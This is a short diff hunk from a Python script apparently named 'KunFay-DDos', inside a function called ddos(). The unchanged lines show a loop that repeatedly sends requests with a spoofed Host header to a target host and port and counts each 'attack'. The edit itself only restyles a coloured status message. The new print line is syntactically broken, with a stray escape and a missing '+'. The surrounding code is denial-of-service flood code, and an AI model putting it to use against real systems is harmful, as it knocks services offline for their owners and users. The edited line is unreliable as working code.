@@ -51,7 +51,7 @@ def ddos():
                 s.sendto(('Host: ' + fake + '\r\n\r\n').encode('ascii'), (trget, port))
 
                 attack_num += 1
-                print("[💥]  \033[93mKunFay-DDos  \033[32mAttack number \033[97m——> \033[0m"+ str(attack_num))
+                print(f"\,n[💥] \033[38;5;39mGet > \033[37m| \033[38;5;220m{trget} \033[37m|\033[38;5;37mPort \033[91m{port} \033[37mH0st \033[33m{fake} \033[32m+ "str(attack_num))
             except socket.error:
                 print('\033[32mConnection failid \033[31mHost may be down \033[94mPlease check host\033[0m')
                 break
